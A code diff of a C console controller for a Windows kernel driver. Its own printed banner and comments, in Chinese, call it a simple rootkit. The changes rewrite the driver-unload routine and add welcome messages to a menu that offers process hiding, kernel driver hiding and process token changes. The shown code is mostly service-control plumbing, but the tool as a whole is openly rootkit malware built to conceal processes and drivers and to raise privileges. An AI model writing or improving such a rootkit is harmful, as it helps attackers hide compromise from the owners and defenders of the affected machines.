@@ -47,20 +47,82 @@ int hidePID(HANDLE hDeviceFile,DWORD pid)
 	return STATUS_SUCCESS;
 }
 
-BOOL unloadDriver(SC_HANDLE svcHandle)
+//卸载驱动程序  
+BOOL UnLoadSys(LPCTSTR szSvrName)
 {
-	SERVICE_STATUS svrSta;
-	if (!ControlService(svcHandle, SERVICE_STOP, &svrSta)) {
-		DBG_TRACE("onUnloadDriver", "could not stop driver");
-		DBG_PRINT2("LastErrorCode:%d\n", GetLastError());
-		return FALSE;
+	//一定义所用到的变量
+	BOOL bRet = FALSE;
+	SC_HANDLE hSCM = NULL;//SCM管理器的句柄,用来存放OpenSCManager的返回值
+	SC_HANDLE hService = NULL;//NT驱动程序的服务句柄，用来存放OpenService的返回值
+	SERVICE_STATUS SvrSta;
+	//二打开SCM管理器
+	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (hSCM == NULL)
+	{
+		//带开SCM管理器失败
+		DBG_TRACE("onUnloadSys", "open SCM failed");
+		DBG_PRINT2("Last Error:%d\n", GetLastError());
+		bRet = FALSE;
+		goto BeforeLeave;
 	}
-	if (!DeleteService(svcHandle)) {
-		DBG_TRACE("onUnloadDriver", "could not delete driver");
-		return FALSE;
+	else
+	{
+		//打开SCM管理器成功
+		DBG_TRACE("onUnloadSys", "open SCM success");
 	}
-	return TRUE;
+	//三打开驱动所对应的服务
+	hService = OpenService(hSCM, szSvrName, SERVICE_ALL_ACCESS);
+
+	if (hService == NULL)
+	{
+		//打开驱动所对应的服务失败 退出
+		DBG_TRACE("onUnloadSys", "open service failed");
+		DBG_PRINT2("Last Error:%d\n", GetLastError());
+		bRet = FALSE;
+		goto BeforeLeave;
+	}
+	else
+	{
+		DBG_TRACE("onUnloadSys", "open service success"); //打开驱动所对应的服务 成功
+	}
+	//四停止驱动程序，如果停止失败，只有重新启动才能，再动态加载。  
+	if (!ControlService(hService, SERVICE_CONTROL_STOP, &SvrSta))
+	{
+		DBG_TRACE("onUnloadSys", "stop service failed");
+		DBG_PRINT2("Last Error:%d\n", GetLastError());
+	}
+	else
+	{
+		//停止驱动程序成功
+		DBG_TRACE("onUnloadSys", "stop service success");
+	}
+	//五动态卸载驱动服务。  
+	if (!DeleteService(hService))  //TRUE//FALSE
+	{
+		//卸载失败
+		DBG_TRACE("onUnloadSys", "uninstall driver failed");
+		DBG_PRINT2("Last Error:%d\n", GetLastError());
+	}
+	else
+	{
+		//卸载成功
+		DBG_TRACE("onUnloadSys", "uninstall driver success");
+
+	}
+	bRet = TRUE;
+	//六 离开前关闭打开的句柄
+BeforeLeave:
+	if (hService>0)
+	{
+		CloseServiceHandle(hService);
+	}
+	if (hSCM>0)
+	{
+		CloseServiceHandle(hSCM);
+	}
+	return bRet;
 }
+
 
 SC_HANDLE installDriver(LPCTSTR driverName, LPCTSTR binaryPath)
 {
@@ -159,19 +221,23 @@ int main()
 		DBG_TRACE("onMain", "could not load driver");
 		return -1;
 	}
+	printf("已成功加载内核层驱动！\n");
+	printf("欢迎使用本软件，本软件是简单Rootkit，提供以下功能：\n");
 
 	while (1) {
 		int n;
-		printf("请输入功能：\n0. 卸载驱动并退出\n1. 隐藏进程\n2. 隐藏内核驱动\n3. 更改进程Token\n");
+		printf("0. 卸载驱动并退出\n1. 隐藏进程\n2. 隐藏内核驱动\n3. 更改进程Token\n请输入功能号：");
 		scanf("%d", &n);
 		switch (n) {
 		case 0:
 		{
+			LPCSTR szSvrName = DRIVER_NAME;
 			printf("正在卸载驱动……\n");
-			if (!unloadDriver(svcHandle)) {
+			if (!UnLoadSys(szSvrName)) {
 				return -1;
 			}
-			printf("正在退出程序\n");
+			printf("驱动已卸载\n");
+			printf("正在退出程序……\n");
 			CloseServiceHandle(svcHandle);
 			free(binaryPath);
 			return 0;
@@ -198,6 +264,7 @@ int main()
 				return -1;
 			}
 		}
+		break;
 
 		default:
 		{
